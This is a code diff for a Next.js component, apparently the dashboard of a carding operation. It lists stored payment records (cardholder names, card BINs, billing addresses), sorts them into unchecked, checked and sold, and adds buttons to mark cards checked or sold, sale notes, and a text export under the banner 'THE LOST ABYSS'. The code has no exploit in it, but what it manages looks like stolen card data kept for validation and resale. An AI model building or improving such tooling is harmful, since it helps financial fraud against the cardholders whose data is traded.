@@ -1,7 +1,7 @@
 'use client';
 
 import { useEffect, useState } from 'react';
-import { useRouter, usePathname } from 'next/navigation';
+import { useRouter } from 'next/navigation';
 import { Checkbox } from '@/components/ui/checkbox';
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';
 import {
@@ -49,6 +49,14 @@ interface PaymentInfo {
   card_bin: string;
   billing_address: BillingAddress;
   created_at: string;
+  checked_cards?: {
+    checked_at: string;
+    notes: string | null;
+  }[];
+  sold_cards?: {
+    sold_at: string;
+    notes: string | null;
+  }[];
 }
 
 type SortField = 'state' | 'timestamp';
@@ -107,7 +115,11 @@ const US_STATES = [
   { name: 'Wyoming', abbr: 'WY' }
 ];
 
-export default function CardsClient() {
+interface CardsClientProps {
+  type: 'all' | 'checked' | 'unchecked' | 'sold';
+}
+
+export function CardsClient({ type }: CardsClientProps) {
   const { toast } = useToast();
   const router = useRouter();
   const [cards, setCards] = useState<PaymentInfo[]>([]);
@@ -121,9 +133,6 @@ export default function CardsClient() {
   const [showActionDialog, setShowActionDialog] = useState<'sold' | 'checked' | null>(null);
   const [actionNotes, setActionNotes] = useState('');
 
-  const pathname = usePathname();
-  const type = pathname.split('/').pop() || 'all';
-
   useEffect(() => {
     async function fetchCards() {
       try {
@@ -136,48 +145,25 @@ export default function CardsClient() {
         // Fetch all cards
         const { data: allCards, error: cardsError } = await supabase
           .from('payment_info')
-          .select('*')
+          .select('*, checked_cards(*), sold_cards(*)')
           .order('created_at', { ascending: false });
 
         if (cardsError) throw cardsError;
-
-        // Fetch checked and sold cards
-        const [{ data: checkedCards }, { data: soldCards }] = await Promise.all([
-          supabase.from('checked_cards').select('card_id, checked_at, notes'),
-          supabase.from('sold_cards').select('card_id, sold_at, notes')
-        ]);
-
-        const checkedCardIds = new Set(checkedCards?.map(c => c.card_id) || []);
-        const soldCardIds = new Set(soldCards?.map(c => c.card_id) || []);
 
         // Filter cards based on type
         let filteredCards = allCards || [];
         if (type === 'unchecked') {
           filteredCards = filteredCards.filter(card => 
-            !checkedCardIds.has(card.id) && !soldCardIds.has(card.id)
+            !card.checked_cards?.length && !card.sold_cards?.length
           );
         } else if (type === 'checked') {
-          filteredCards = filteredCards.filter(card => {
-            const isChecked = checkedCardIds.has(card.id);
-            const isSold = soldCardIds.has(card.id);
-            return isChecked && !isSold;
-          }).map(card => ({
-            ...card,
-            checked_cards: [{
-              checked_at: checkedCards?.find(c => c.card_id === card.id)?.checked_at,
-              notes: checkedCards?.find(c => c.card_id === card.id)?.notes
-            }]
-          }));
+          filteredCards = filteredCards.filter(card => 
+            card.checked_cards?.length && !card.sold_cards?.length
+          );
         } else if (type === 'sold') {
           filteredCards = filteredCards.filter(card => 
-            soldCardIds.has(card.id)
-          ).map(card => ({
-            ...card,
-            sold_cards: [{
-              sold_at: soldCards?.find(c => c.card_id === card.id)?.sold_at,
-              notes: soldCards?.find(c => c.card_id === card.id)?.notes
-            }]
-          }));
+            card.sold_cards?.length
+          );
         }
 
         setCards(filteredCards);
@@ -255,11 +241,28 @@ export default function CardsClient() {
       // Refresh the cards list
       const { data: updatedCards, error: fetchError } = await supabase
         .from('payment_info')
-        .select('*')
+        .select('*, checked_cards(*), sold_cards(*)')
         .order('created_at', { ascending: false });
 
       if (fetchError) throw fetchError;
-      setCards(updatedCards || []);
+      
+      // Filter cards based on type
+      let filteredCards = updatedCards || [];
+      if (type === 'unchecked') {
+        filteredCards = filteredCards.filter(card => 
+          !card.checked_cards?.length && !card.sold_cards?.length
+        );
+      } else if (type === 'checked') {
+        filteredCards = filteredCards.filter(card => 
+          card.checked_cards?.length && !card.sold_cards?.length
+        );
+      } else if (type === 'sold') {
+        filteredCards = filteredCards.filter(card => 
+          card.sold_cards?.length
+        );
+      }
+
+      setCards(filteredCards);
     } catch (err) {
       console.error(`Error marking cards as ${action}:`, err);
       toast({
@@ -284,18 +287,6 @@ export default function CardsClient() {
         return sortDirection === 'asc'
           ? stateA.localeCompare(stateB)
           : stateB.localeCompare(stateA);
-      } else if (type === 'checked' && 'checked_cards' in a) {
-        const dateA = new Date(a.checked_cards[0]?.checked_at || '').getTime();
-        const dateB = new Date(b.checked_cards[0]?.checked_at || '').getTime();
-        return sortDirection === 'asc'
-          ? dateA - dateB
-          : dateB - dateA;
-      } else if (type === 'sold' && 'sold_cards' in a) {
-        const dateA = new Date(a.sold_cards[0]?.sold_at || '').getTime();
-        const dateB = new Date(b.sold_cards[0]?.sold_at || '').getTime();
-        return sortDirection === 'asc'
-          ? dateA - dateB
-          : dateB - dateA;
       } else {
         const dateA = new Date(a.created_at).getTime();
         const dateB = new Date(b.created_at).getTime();
@@ -327,6 +318,10 @@ export default function CardsClient() {
 + ------------------------------------------+
 + Other Information
 | Received : ${new Date(card.created_at).toLocaleString()}
+${card.checked_cards?.[0] ? `| Checked : ${new Date(card.checked_cards[0].checked_at).toLocaleString()}
+| Check Notes : ${card.checked_cards[0].notes || 'No notes'}` : ''}
+${card.sold_cards?.[0] ? `| Sold : ${new Date(card.sold_cards[0].sold_at).toLocaleString()}
+| Sale Notes : ${card.sold_cards[0].notes || 'No notes'}` : ''}
 + ------------- THE LOST ABYSS  --------------+`;
 
     try {
@@ -354,16 +349,18 @@ export default function CardsClient() {
     <div className="space-y-6">
       <div className="flex justify-between items-center">
         <h1 className="text-3xl font-bold">{type === 'all' ? 'All' : type === 'sold' ? 'Sold' : type === 'checked' ? 'Checked' : 'Unchecked'} Cards</h1>
-        {selectedCards.size > 0 && (
+        {selectedCards.size > 0 && type !== 'sold' && (
           <div className="flex gap-2">
-            <Button
-              variant="outline"
-              onClick={() => setShowActionDialog('checked')}
-              className="flex items-center gap-2"
-            >
-              <Shield className="h-4 w-4" />
-              Mark as Checked
-            </Button>
+            {type !== 'checked' && (
+              <Button
+                variant="outline"
+                onClick={() => setShowActionDialog('checked')}
+                className="flex items-center gap-2"
+              >
+                <Shield className="h-4 w-4" />
+                Mark as Checked
+              </Button>
+            )}
             <Button
               variant="default"
               onClick={() => setShowActionDialog('sold')}
@@ -396,12 +393,14 @@ export default function CardsClient() {
         <Table>
           <TableHeader>
             <TableRow>
-              <TableHead className="w-[50px]">
-                <Checkbox
-                  checked={selectedCards.size === filteredAndSortedCards.length && filteredAndSortedCards.length > 0}
-                  onCheckedChange={handleSelectAll}
-                />
-              </TableHead>
+              {type !== 'sold' && (
+                <TableHead className="w-[50px]">
+                  <Checkbox
+                    checked={selectedCards.size === filteredAndSortedCards.length && filteredAndSortedCards.length > 0}
+                    onCheckedChange={handleSelectAll}
+                  />
+                </TableHead>
+              )}
               <TableHead>Full Name</TableHead>
               <TableHead>
                 <Button
@@ -434,18 +433,23 @@ export default function CardsClient() {
                   )}
                 </Button>
               </TableHead>
+              {(type === 'checked' || type === 'sold') && (
+                <TableHead>Notes</TableHead>
+              )}
               <TableHead className="text-right pr-6">Actions</TableHead>
             </TableRow>
           </TableHeader>
           <TableBody>
             {filteredAndSortedCards.map((card) => (
               <TableRow key={card.id}>
-                <TableCell>
-                  <Checkbox
-                    checked={selectedCards.has(card.id)}
-                    onCheckedChange={() => handleSelectCard(card.id)}
-                  />
-                </TableCell>
+                {type !== 'sold' && (
+                  <TableCell>
+                    <Checkbox
+                      checked={selectedCards.has(card.id)}
+                      onCheckedChange={() => handleSelectCard(card.id)}
+                    />
+                  </TableCell>
+                )}
                 <TableCell>{card.cardholder_name}</TableCell>
                 <TableCell>
                   {US_STATES.find(s => s.abbr === card.billing_address.state)?.name || card.billing_address.state}
@@ -454,6 +458,12 @@ export default function CardsClient() {
                 </TableCell>
                 <TableCell>{card.card_bin}</TableCell>
                 <TableCell>{new Date(card.created_at).toLocaleString()}</TableCell>
+                {type === 'checked' && (
+                  <TableCell>{card.checked_cards?.[0]?.notes || '-'}</TableCell>
+                )}
+                {type === 'sold' && (
+                  <TableCell>{card.sold_cards?.[0]?.notes || '-'}</TableCell>
+                )}
                 <TableCell className="text-right pr-4">
                   <div className="flex justify-end gap-2">
                     <Button
@@ -561,9 +571,27 @@ export default function CardsClient() {
                   <p className="mt-1">{selectedCard.billing_address.country}</p>
                 </div>
               </div>
-              <div className="text-center">
-                <h4 className="font-medium text-sm text-muted-foreground">Received</h4>
-                <p className="mt-1">{new Date(selectedCard.created_at).toLocaleString()}</p>
+              <div className="space-y-4 text-center">
+                <div>
+                  <h4 className="font-medium text-sm text-muted-foreground">Received</h4>
+                  <p className="mt-1">{new Date(selectedCard.created_at).toLocaleString()}</p>
+                </div>
+                {selectedCard.checked_cards?.[0] && (
+                  <div>
+                    <h4 className="font-medium text-sm text-muted-foreground">Checked</h4>
+                    <p className="mt-1">{new Date(selectedCard.checked_cards[0].checked_at).toLocaleString()}</p>
+                    <h4 className="font-medium text-sm text-muted-foreground mt-2">Check Notes</h4>
+                    <p className="mt-1">{selectedCard.checked_cards[0].notes || 'No notes'}</p>
+                  </div>
+                )}
+                {selectedCard.sold_cards?.[0] && (
+                  <div>
+                    <h4 className="font-medium text-sm text-muted-foreground">Sold</h4>
+                    <p className="mt-1">{new Date(selectedCard.sold_cards[0].sold_at).toLocaleString()}</p>
+                    <h4 className="font-medium text-sm text-muted-foreground mt-2">Sale Notes</h4>
+                    <p className="mt-1">{selectedCard.sold_cards[0].notes || 'No notes'}</p>
+                  </div>
+                )}
               </div>
             </div>
           )}
